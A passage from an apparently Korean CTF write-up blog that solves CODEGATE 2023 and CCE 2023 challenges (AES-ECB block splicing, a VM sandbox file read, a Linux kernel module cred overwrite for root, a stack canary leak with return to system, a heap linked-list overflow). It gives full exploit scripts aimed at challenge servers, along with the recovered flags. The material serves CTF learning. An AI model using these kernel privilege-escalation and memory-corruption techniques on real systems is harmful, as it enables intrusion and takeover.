print(self.stack.pop()) str_concat = \u0026#34;⭐️\u0026#34; str_index = \u0026#34;♥️\u0026#34; # string[index] strlen = \u0026#34;➖\u0026#34; # push(len(char)) done = \u0026#34;🐸\u0026#34; readfile = \u0026#34;🧠\u0026#34; # filename, index sleep_time = \u0026#34;🗣️\u0026#34; def push_string(x): x = x[::-1] gen_IL(push,x[0]) for i in range(len(x)-1): gen_IL(push,x[i+1]) gen_IL(str_concat) gen_IL(push,[[\u0026#34;NOOOO\u0026#34;]]) gen_IL(reg_v,[\u0026#34;blacklist\u0026#34;]) gen_IL(push_reg,[\u0026#34;blacklist\u0026#34;]) gen_IL(dump_stack) gen_IL(push,[[\u0026#34;read_text\u0026#34;, \u0026#34;exists\u0026#34;, \u0026#34;glob\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;read_bytes\u0026#34;, \u0026#34;mkdir\u0026#34;, \u0026#34;write_bytes\u0026#34;, \u0026#34;write_text\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;is_file\u0026#34;,\u0026#39;cwd\u0026#39;]]) gen_IL(reg_v,[\u0026#34;file_options\u0026#34;]) gen_IL(push_reg,[\u0026#34;file_options\u0026#34;]) gen_IL(dump_stack) gen_IL(push,[0]) push_string(\u0026#34;/home/ctf/codegate2023-read-plz\u0026#34;) # /etc/passwd gen_IL(readfile) gen_IL(dump_stack) # gen_IL(push,[2]) # push_string(\u0026#34;/home/ctf\u0026#34;) # gen_IL(readfile,[\u0026#39;**/*\u0026#39;]) # gen_IL(dump_stack) p = remote(\u0026#34;43.202.60.58\u0026#34;,5333) p.sendline(payload(IL)) p.interactive() # gen_IL(push,\u0026#34;read_text\u0026#34;) # gen_IL(reg_v,[\u0026#34;file_options\u0026#34;]) codegate2023{ab364274a7507b29b525cf4f1a00d71ec2d9bc278aad2d81fcddaf2710a6c52ee079cb6823860d9ea210bfc9e10b3a}\nCryptoGenius #!/usr/bin/python3 from hashlib import md5 from Crypto.Cipher import AES from base64 import * from secret import secret_key,flag BS = 16 KEY = secret_key FLAG = flag pad = lambda s: s + (BS - len(s) % BS) * \\ chr(BS - len(s) % BS) unpad = lambda s: s[:-ord(s[len(s) - 1:])] def encrypt(raw): raw = pad(raw) cipher = AES.new(KEY, AES.MODE_ECB) return b64encode(cipher.encrypt(raw.encode(\u0026#39;utf8\u0026#39;))) def decrypt(enc): enc = b64decode(enc) cipher = AES.new(KEY, AES.MODE_ECB) return unpad(cipher.decrypt(enc)).decode(\u0026#39;utf8\u0026#39;) def main(): while True: print (\u0026#34;\u0026#34;\u0026#34; ========= Your Behavior ========= 1. EXPERIMENT 2. SUBMIT 3. CLOSE \u0026#34;\u0026#34;\u0026#34;) behavior = int(input(\u0026#34;your behavior \u0026gt; \u0026#34;)) if behavior == 1: print (\u0026#34;I\u0026#39;m a crypto genius\u0026#34;) input_data = input(\u0026#34;Do you want to experiment? \u0026gt; \u0026#34;) if len(input_data) \u0026gt; 20: print (\u0026#34;It\u0026#39;s still too much...\u0026#34;) else: enc = encrypt(input_data) print (enc) elif behavior == 2: input_data = input (\u0026#34;Did you already solve the trick? \u0026gt; \u0026#34;) try: dec = decrypt(input_data) if len(dec) == 128 and dec == \u0026#34;6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7\u0026#34;: print (f\u0026#34;flag : {FLAG}\u0026#34;) else: print (\u0026#34;you\u0026#39;re still far away\u0026#34;) except: print (\u0026#34;you\u0026#39;re still far away\u0026#34;) continue elif behavior == 3: print (\u0026#34;BYE ... \u0026#34;) break else: print(\u0026#34;[*] Invalid input\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main () Exploitation MODE_ECB라서 블록간에 간섭이 없다. 16바이트씩 자르고, 다시 붙이면 된다.\nExploit script from pwn import * from base64 import * p = remote(\u0026#39;13.124.113.252\u0026#39;, 12345) t = \u0026#34;6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7\u0026#34; l = [] for i in range(0, len(t), 16): l.append(t[i:i+16]) enc = [] for i in range(len(l)): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,l[i]) res = p.recvline() enc.append(res[2:-2]) print(enc) e = b\u0026#34;\u0026#34; for i in range(len(enc)-1): print(enc[i][:len(enc[i])//2]) e += b64decode(enc[i][:len(enc[i])//2]+b\u0026#39;==\u0026#39;) e += b64decode(enc[-1]) p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,\u0026#39;2\u0026#39;) p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,b64encode(e).decode()) p.interactive() codegate2023{68aeb23b86f64549bcd8ca414cd93a8d1de108da959d645952edc56c2c85d3702e0e36b9dd35f0f09a92ae97e0b785daec}\n","permalink":"https://msh1307.kr/blog/codegate_junior_2023_quals/","summary":"PCPU 대회 끝나기 2시간정도 전에 잡았었는데, 분석하기 빡세고 구조체도 많아서 시간내로 못풀었다. 나중에 끝나고 천천히 풀어봤다. 파이프라이닝이 적용된 VCPU 컨셉의 문제다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { init_(); input_validchk(); // opcode(1byte) | operands(3bytes) while ( PC \u0026lt;= instr_sz ) { run_cycle(); ++PC; } run_cycle(); run_cycle(); run_cycle(); print_cycle(); return 0LL; } int init_() { unsigned int v0; // eax v0 = time(0LL); srand(v0); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); IF_NODE = malloc(0x10uLL); ID_NODE = malloc(0x10uLL); OF_NODE = malloc(0x10uLL); EX_NODE = malloc(0x10uLL); REG = malloc(0x20uLL); memset(REG, 0, sizeof(REG_SETS)); init_m(IF_NODE); init_m(ID_NODE); init_m(OF_NODE); init_m(EX_NODE); ANON.","title":"CODEGATE 2023 Quals"},{"content":"K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; 똑같은데 디버깅 옵션만 빠진거같다.\nk-exploit.ko _fentry__(flip, cmd); copy_from_user(index, usr_, 0x20LL); if ( (_DWORD)cmd == 0x10002 ) // modify { idx = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_BA0, idx); v11 = arr[idx]; if ( !v11 ) return -1LL; cnt = sz; if ( sz \u0026gt; (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); } ioctl로 modify 할 수 있다. 구조체를 userland에서 받아서 그걸 바탕으로 처리를 진행한다.\nif ( (unsigned int)cmd \u0026gt; 0x10002 ) { if ( (_DWORD)cmd == 0x10003 ) // CREATE { v15 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B80, v15); v6 = arr[v15]; if ( v6 ) { return -1LL; } else if ( (unsigned __int64)sz \u0026gt; 0xA0 ) { return -1LL; } else { to = _kmalloc(sz, 0x6000C0LL); if ( to ) { arr[v15] = to; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_from_user(to, src, sz); arr[v15 + 1] = sz; } else { return -1LL; } } } kmalloc을 한다.\nelse if ( (_DWORD)cmd == 0x10004 ) // DELETE { v4 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B60, v4); v5 = arr[v4]; if ( v5 ) { kfree(v5); arr[v4] = 0LL; return 0LL; } else { return -1LL; } } else { return 0LL; } return v6; } 얘는 kfree하는데 사용한다.\nif ( (_DWORD)cmd != 0x1337 ) { if ( (_DWORD)cmd != 0x10001 ) return 0LL; v8 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_BC0, v8); usr = arr[v8]; if ( !usr ) return -1LL; if ( sz \u0026gt; (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; } v17 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x27 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B40, v17); v6 = arr[v17]; if ( v6 ) { cnt = sz; from_ = src; to_ = *(_QWORD *)(v6 + 8 * off); if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); LABEL_26: copy_from_user(to_, from_, cnt); 0x1337은 포인터 참조 두번하고 userland의 데이터로 덮는다. 0x1001은 메모리를 읽어주고 userland로 돌려준다.\nimport hashlib import base64 from pwn import * REMOTE_IP = \u0026#34;20.196.194.8\u0026#34; REMOTE_PORT = 1234 EXPLOIT_URL = b\u0026#34;??\u0026#34; io = remote(REMOTE_IP, REMOTE_PORT) def solvepow(x, target): x = bytes.fromhex(x) target = bytes.fromhex(target) for i in range(256**3): if hashlib.md5(x + i.to_bytes(3, \u0026#34;big\u0026#34;)).digest() == target: return x.hex()+hex(i)[2:] def main(): line = io.recvuntil(b\u0026#34;\\n\u0026#34;) x = line.split(b\u0026#34;= \u0026#34;)[1][:26].decode(\u0026#34;utf-8\u0026#34;) target = line.split(b\u0026#34;= \u0026#34;)[2][:32].decode(\u0026#34;utf-8\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(bytes(solvepow(x, target), \u0026#34;utf-8\u0026#34;)) io.recvuntil(b\u0026#34;link\\n\u0026#34;) io.sendline(b\u0026#34;1\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) f = open(\u0026#34;./a.out\u0026#34;, \u0026#34;rb\u0026#34;) data = base64.b64encode(f.read()) f.close() io.sendline(data) # io.sendline(EXPLOIT_URL) io.interactive() return if __name__ == \u0026#39;__main__\u0026#39;: main() 이거 때문에 브포하기 힘들다.\nExploitation ~ # cat /proc/slabinfo | grep cred cred_jar 105 105 192 21 1 : tunables 0 0 0 : slabdata 5 5 0 slab info 확인해서 cred 크기 확인해보면, 0xc0이라서 잘 맞추고 스프레이하고 인접한 cred를 덮으려고 했는데 막혀있다. UAF도 불가능하다.\nif ( sz \u0026gt; (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); if ( sz \u0026gt; (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; off 검증이 없다. 원래 0x1337이나 0x1001도 있는데 어떤 곳에 사용해야할지 잘 모르겠고 시간도 부족해서, 간단하게 fork로 cred 구조체 heap spraying 하고 브포했다. 생각보다 엔트로피가 그렇게 크지 않아보여서 시도해봤는데, 막상 remote로 보낼때 pow_client.py 때문에 브포하기 힘들었다.\n/* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu\t*cred; #ifdef CONFIG_KEYS /* Cached requested key. */ struct key\t*cached_requested_key; #endif /* * executable name, excluding path. * * - normally initialized setup_new_exec() * - access it with [gs]et_task_comm() * - lock it with task_lock() */ char\tcomm[TASK_COMM_LEN]; 출제자분의 라이트업에서는 task_struct를 찾기 위해서 prctl PR_SET_NAME으로 이름을 바꿔주고 0x1001로 메모리를 읽으면서 그 문자열 위치를 탐색하고 문자열 위치 - 0x10 위치에 cred 구조체 포인터가 있으니까 0x1337로 참조해서 익스했다.\nExploit script #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; struct ioctl_info { uint32_t idx; uint32_t dummy; uint64_t src; uint64_t sz; uint64_t off; }__attribute__((packed)); #define CREATE 0x10003 #define MODIFY 0x10002 #define DELETE 0x10004 int main() { int fd; struct ioctl_info io; if ((fd = open(\u0026#34;/dev/K-exploit\u0026#34;, O_RDWR)) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); exit(1); } io.idx = 0; char * buf = malloc(0xc0); strcpy(buf, \u0026#34;DEADBEEF0\u0026#34;); io.src = (int64_t)buf; io.sz = 0xa0; // cred if ((int)ioctl(fd, CREATE, \u0026amp;io) \u0026lt; 0){ io.idx =0; ioctl(fd, DELETE, \u0026amp;io); if ((int)ioctl(fd, CREATE, \u0026amp;io) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); } } char * flag = malloc(0x40); int fl = 0; int pid[0x100]; for(int i =0;i\u0026lt;0x100;i++){ pid[i] = fork(); if (pid[i] == 0){ sleep(3); if (getuid() == 0){ fl = 0; puts(\u0026#34;priv escalated\u0026#34;); int f = open(\u0026#34;/flag\u0026#34;,O_RDONLY); printf(\u0026#34;%d\u0026#34;,f); read(f, flag,0x40); puts(flag); } exit(0); } else if (pid[i] == -1){ puts(\u0026#34;fork error\u0026#34;); } } memcpy(buf,\u0026#34;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;,40); int v; for (int i=0;i\u0026lt; 30;i++){ io.off = (0xac480-0xc0*10)/0x8 + i; io.sz = 40; if ((int)ioctl(fd, MODIFY, \u0026amp;io) \u0026lt; 0){ puts(\u0026#34;ERR\u0026#34;); exit(1); } puts(\u0026#34;trying\u0026#34;); } int status; wait(\u0026amp;status); close(fd); if(fl == 0){ puts(\u0026#34;NOPE\u0026#34;); } return 0; } cce2023{y0u_kn0w_Linux_k3rn3l_3xploit?}\nn0t_rand0m Analysis setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); puts(\u0026#34;what your name?\u0026#34;); read(0, buf, 8uLL); printf(\u0026#34;Hello %s\u0026#34;, buf); puts(\u0026#34;write comment\u0026#34;); read(0, comment, 0x18uLL); v3 = time(0LL); srand(v3); while ( 1 ) { while ( 1 ) { nbytes_4 = rand() % 9 + 1; printf(\u0026#34;random number : %d\\n\u0026#34;, nbytes_4); printf(\u0026#34;continue? (yes or no) \u0026#34;); read(0, haystack, 8uLL); if ( strstr(haystack, \u0026#34;no\u0026#34;) ) break; if ( !strstr(haystack, \u0026#34;yes\u0026#34;) ) exit(1); } switch ( nbytes_4 ) { case 1u: printf(\u0026#34;comment : %s\\n\u0026#34;, comment); continue; case 2u: printf(\u0026#34;name : %s\\n\u0026#34;, buf); continue; case 3u: puts(\u0026#34;write new comment\u0026#34;); read(0, comment, nbytes); continue; case 4u: puts(\u0026#34;write new name\u0026#34;); read(0, buf, nbytes); continue; case 5u: nbytes = strlen(comment); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 6u: nbytes = strlen(buf); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 7u: sub_401296(nbytes); goto LABEL_15; case 8u: sub_401345(nbytes); goto LABEL_15; case 9u: LABEL_15: exit(1); case 0xAu: sub_4013B1(buf); break; default: continue; } } } unsigned __int64 __fastcall sub_401296(unsigned int a1) { char buf[8]; // [rsp+18h] [rbp-28h] BYREF char v3[24]; // [rsp+20h] [rbp-20h] BYREF unsigned __int64 v4; // [rsp+38h] [rbp-8h] v4 = __readfsqword(0x28u); puts(\u0026#34;one more time what your name\u0026#34;); read(0, buf, a1); printf(\u0026#34;ok %s\\n\u0026#34;, buf); puts(\u0026#34;did you have fun?\u0026#34;); read(0, v3, a1); puts(\u0026#34;ok...bye\u0026#34;); return v4 - __readfsqword(0x28u); } int __fastcall sub_4013B1(const char *a1) { return system(a1); } 일반적으로는 %9 + 1 때문에 0xa에는 접근할 수 없다.\nExploitation char buf[8]; // [rsp+8h] [rbp-28h] BYREF char comment[24]; // [rsp+10h] [rbp-20h] BYREF comment와 buf가 인접해있다.\ncase 5u: nbytes = strlen(comment); printf(\u0026#34;%d\\n\u0026#34;, nbytes); continue; case 6u: nbytes = strlen(buf); printf(\u0026#34;%d\\n\u0026#34;, nbytes); nbytes를 strlen으로 늘릴 수 있다. 인접해있기에 strlen(buf)로 늘려주면 nbytes를 늘릴 수 있다.\nsub_401296타고 들어가서 canary leak하고 ret를 system 쪽으로 뛰면 된다.\nExploit script from pwn import * from ctypes import CDLL e = ELF(\u0026#39;./n0t_rand0m\u0026#39;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) #p = process(\u0026#39;./n0t_rand0m\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;./libc.so.6\u0026#34;}) p = remote(\u0026#34;20.196.192.95\u0026#34;,8888) context.log_level=\u0026#39;debug\u0026#39; def func(n): while True: rvu(b\u0026#39;random number : \u0026#39;) r = int(rvl()[:-1]) if r == n: sa(b\u0026#39;continue? (yes or no)\u0026#39;,b\u0026#39;no\u0026#39;) break else: sa(b\u0026#39;continue? (yes or no)\u0026#39;,b\u0026#39;yes\u0026#39;) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) rvl = lambda : p.recvline() sa(b\u0026#39;what your name?\u0026#39;,b\u0026#39;A\u0026#39;*8) rvu(b\u0026#34;A\u0026#34;*8) # stack = u64(rvu(b\u0026#34;\\x7f\u0026#34;).ljust(8,b\u0026#39;\\x00\u0026#39;)) # success(hex(stack-0x2b1)) # local leak sa(b\u0026#39;write comment\u0026#39;,b\u0026#39;A\u0026#39;*0x18) func(2) func(6) func(3) sa(b\u0026#39;write new comment\u0026#39;,b\u0026#39;A\u0026#39;*0x20) func(6) func(3) sa(b\u0026#39;write new comment\u0026#39;,b\u0026#39;A\u0026#39;*0x28) func(6) func(1) rvu(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) l =u64(rvu(b\u0026#39;\\x7f\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;)) #remote leak success(hex(l)) # func(4) # sa(b\u0026#39;write new name\u0026#39;,b\u0026#39;sh\\x00\u0026#39;) # func(7) # sa(b\u0026#39;one more time what your name\u0026#39;,b\u0026#39;A\u0026#39;*0x21) # rvu(b\u0026#39;A\u0026#39;*0x21) # can = b\u0026#39;\\x00\u0026#39;+p.recv(7) # sa(b\u0026#39;did you have fun?\u0026#39;,b\u0026#39;A\u0026#39;*0x18 + can +p64(stack-0x2b1+0x28)+p64(0x04016B0)) func(7) sa(b\u0026#39;one more time what your name\u0026#39;,b\u0026#39;A\u0026#39;*0x21) rvu(b\u0026#39;A\u0026#39;*0x21) can = b\u0026#39;\\x00\u0026#39;+p.recv(7) sa(b\u0026#39;did you have fun?\u0026#39;,b\u0026#39;A\u0026#39;*0x18 + can +p64(l + 0x1ae908 + 0x28)+p64(0x04016B0)) p.interactive() 로컬에선 릭이 됐는데, 리모트에선 안되길래 그냥 따로 릭을 진행했다. cce2023{c306445363ca0d34c2fd4ba6e2da5ea19052ae855d00b3b46bc71785d16db14542d944d41934e2bcdab0816a154a8872b1258334cbc2f2672004db5a}\nFit 이건 대회끝나고 보니까 솔버나왔길래 궁금해서 풀어봤다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax v3 = time(0LL); srand(v3); initscr(); raw(); curs_set(1); resizeterm(25, 80); cbreak(); keypad(stdscr, 1); noecho(); go(); endwin(); echo(); return 0LL; } ncurses 냄새가 난다.\nv11 = __readfsqword(0x28u); clock_gettime(1, \u0026amp;tp); clock_gettime(1, \u0026amp;v6); memset(rand_char, 0, sizeof(rand_char)); v8 = 0; memset(input_, 0, sizeof(input_)); v10 = 0; stage_ = 1; v3 = 0; get_rand_char_20(rand_char); render_screen(1u, 0, rand_char, (const char *)input_); while ( 1 ) { do { while ( 1 ) { while ( 1 ) { v4 = wgetch(stdscr); if ( v4 == -1 ) goto LABEL_18; if ( (v4 \u0026lt;= \u0026#39;@\u0026#39; || v4 \u0026gt; \u0026#39;a\u0026#39;) \u0026amp;\u0026amp; (v4 \u0026lt;= \u0026#39;`\u0026#39; || v4 \u0026gt; \u0026#39;z\u0026#39;) \u0026amp;\u0026amp; (v4 \u0026lt;= \u0026#39;/\u0026#39; || v4 \u0026gt; \u0026#39;9\u0026#39;) ) break; if ( v3 \u0026lt;= 19 ) *((_BYTE *)input_ + v3++) = v4; } if ( v4 != 0x107 ) break; if ( v3 \u0026gt; 0 ) --v3; *((_BYTE *)input_ + v3) = 0; wclear(qword_5250); } } while ( v4 != 0x157 \u0026amp;\u0026amp; v4 != \u0026#39;\\n\u0026#39; ); // get_by_line LABEL_18: if ( v4 == 343 || v4 == 10 ) break; LABEL_24: get_time(\u0026amp;v6); render_screen(stage_, LODWORD(v6.tv_sec) - LODWORD(tp.tv_sec), rand_char, (const char *)input_); } if ( memcmp(input_, rand_char, 20uLL) ) // not correct -\u0026gt; go input again { LABEL_23: wclear(qword_5250); memset(input_, 0, 20uLL); v3 = 0; goto LABEL_24; } if ( ++stage_ != 6 ) { get_rand_char_20(rand_char); goto LABEL_23; } clock_gettime(1, \u0026amp;v6); *game_struct = v6.tv_sec - tp.tv_sec; // time if ( v6.tv_nsec \u0026gt;= tp.tv_nsec ) { game_struct[1] = v6.tv_nsec - tp.tv_nsec; } else { --*game_struct; game_struct[1] = v6.tv_nsec + 1000000000 - tp.tv_nsec; } return v11 - __readfsqword(0x28u); } 랜덤으로 문자열 뽑아서 입력된 문자열과 비교한다.\n_BOOL8 __fastcall retry_(__int64 *game_struct) { int i; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] _QWORD *v4; // [rsp+18h] [rbp-8h] register_game_result(game_struct); // heap leak next node pointer leak vulnerabililty wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); wmove(stdscr, 2, 38); printw(\u0026#34;Record\u0026#34;); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u0026lt;= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\u0026#34;%d.\u0026#34;, (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u0026gt; 0 { wmove(stdscr, 3 * i + 5, 11); printw(\u0026#34;%s\u0026#34;, (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\u0026#34;%ld.%ld\u0026#34;, *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); echo(); printw(\u0026#34;Retry(y/N)?\u0026#34;); v3 = wgetch(stdscr); noecho(); return v3 != \u0026#39;y\u0026#39;; } 한판 끝나고 결과 저장해주고, 더 할건지 묻는다.\n0LL); wmove(stdscr, 5, 37); printw(\u0026#34;Result\u0026#34;); wmove(stdscr, 9, 30); printw(\u0026#34;Passed Time: %ld.%ld\u0026#34;, *game_struct, game_struct[1]); wmove(stdscr, 13, 20); printw(\u0026#34;Name: \u0026#34;); wrefresh(stdscr); echo(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); noecho(); if ( current_res_block ) current_res_block[5] = (__int64)game_res_struct_malloc; else start_res_block[5] = game_res_struct_malloc; result = (unsigned __int64)game_res_struct_malloc; current_res_block = game_res_struct_malloc; } return result; } 이름을 기록한다. singly linked list로 저장한다.\nwmove(stdscr, 13, 20); printw(\u0026#34;Name index: \u0026#34;); wrefresh(stdscr); echo(); scanw(\u0026#34;%d\u0026#34;, \u0026amp;idx); wclear(stdscr); wborder( stdscr, (unsigned int)dword_5200, (unsigned int)dword_5200, (unsigned int)dword_51E4, (unsigned int)dword_51E4, 0LL, 0LL, 0LL, 0LL); noecho(); wmove(stdscr, 13, 20); printw(\u0026#34;Name: \u0026#34;);\twrefresh(stdscr); echo(); v3 = read(0, NAME, 0x14uLL); NAME[v3 - 1] = 0; noecho(); for ( i = 0; i \u0026lt; idx; ++i ) { if ( !v4 ) return v7 - __readfsqword(0x28u); v5 = v4; v4 = (__int64 *)v4[5]; // next ptr } if ( v4 ) // if exists { memcpy(v4 + 2, NAME, 0x14uLL); // name rewriting? AAW trigger? puts((const char *)v5 + 0x10); // print_name? } return v7 - __readfsqword(0x28u); } 게임 끝나고 \u0026lsquo;y\u0026rsquo;가 아니라면 실행되는 함수다. idx 받고 이름 다시 써준다.\nExploitation 취약점은 대놓고 주는데, 익스가 오래걸렸다. I/O가 이상해서 pyte 터미널 에뮬레이터를 활용했다.\ngame_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; game_res_struct_malloc[1] = game_struct[1]; game_res_struct_malloc[5] = 0LL; read(0, game_res_struct_malloc + 2, 0x20uLL); 경계 체크가 미흡해서 다음 노드를 가리키는 포인터를 덮을 수 있다.\necho(); game_res_struct_malloc = (__int64 *)malloc(0x30uLL); *game_res_struct_malloc = *game_struct; 초기화가 하지 않아서 UAF를 트리거할 수 있다.\nwmove(stdscr, 2, 38); printw(\u0026#34;Record\u0026#34;); v4 = (_QWORD *)start_res_block[5]; for ( i = 0; i \u0026lt;= 4; ++i ) { wmove(stdscr, 3 * i + 5, 7); printw(\u0026#34;%d.\u0026#34;, (unsigned int)(i + 1)); if ( v4 ) // block + 0x28 -\u0026gt; 0 { wmove(stdscr, 3 * i + 5, 11); printw(\u0026#34;%s\u0026#34;, (const char *)v4 + 0x10); // heap leak vuln trigger wmove(stdscr, 3 * i + 5, 52); printw(\u0026#34;%ld.%ld\u0026#34;, *v4, v4[1]); v4 = (_QWORD *)v4[5]; // AAR ? next pointer can be overflowed } } wmove(stdscr, 20, 34); 출력해줘서 여기서 릭하면 된다.\n__int64 printw(__int64 a1, ...) { __va_list_tag va[1]; // [rsp+0h] [rbp-D8h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-C0h] va_start(va, a1); v3 = __readfsqword(0x28u); return vw_printw((__int64)stdscr, a1, (__int64)va); } __int64 __fastcall vw_printw(__int16 *a1, __int64 a2, __int64 a3) { __int64 v4; // rax unsigned __int8 *v5; // rax v4 = _nc_screen_of(a1); v5 = (unsigned __int8 *)sub_189A0(v4, a2, a3); if ( v5 ) return waddnstr(a1, v5, -1); else return 0xFFFFFFFFLL; } goto LABEL_54; return v23; } v51 = string; v6 = v5 + (_DWORD)string + 1; while ( 1 ) { ++v51; v7 = _nc_screen_of(a1); v8 = (unsigned __int8 *)unctrl_sp(v7, v3); if ( !v8[1] || (v9 = __ctype_b_loc(), ((*v9)[v3] \u0026amp; 0x4002) == 0x4000) ) { v25 = *((_DWORD *)a1 + 4); v26 = a1[1]; v27 = *((_DWORD *)a1 + 5); v28 = a1[1]; v29 = BYTE1(v25); char *__fastcall unctrl_sp(__int64 a1, unsigned __int8 a2) { int v2; // eax int v3; // eax __int64 v5; // rax const unsigned __int16 **v6; // r8 if ( a1 ) { v2 = *(_DWORD *)(a1 + 1496); if ( v2 \u0026gt; 1 ) { v3 = a2 - 128; if ( (unsigned int)v3 \u0026lt;= 0x1F || (unsigned int)a2 - 160 \u0026lt;= 0x5F ) return (char *)\u0026amp;unk_293A0 + word_297C0[v3]; goto LABEL_7; } if ( (unsigned int)a2 - 160 \u0026lt;= 0x5F ) { if ( v2 != 1 ) { if ( v2 ) goto LABEL_7; v6 = __ctype_b_loc(); v5 = a2; if ( ((*v6)[a2] \u0026amp; 0x4000) == 0 ) return (char *)\u0026amp;unk_293A0 + *((__int16 *)\u0026amp;off_291A0 + v5); } v3 = a2 - 128; return (char *)\u0026amp;unk_293A0 + word_297C0[v3]; } } LABEL_7: v5 = a2; return (char *)\u0026amp;unk_293A0 + *((__int16 *)\u0026amp;off_291A0 + v5); } 특정 범위에 안걸리면 릭이 제대로 되서 간단하게 제대로 된 주소 나올때까지 반복적으로 시도하면 바로 익스할 수 있었지만, printw의 출력 로직을 분석해서 한번에 익스플로잇되도록 만들었다. 겹치는 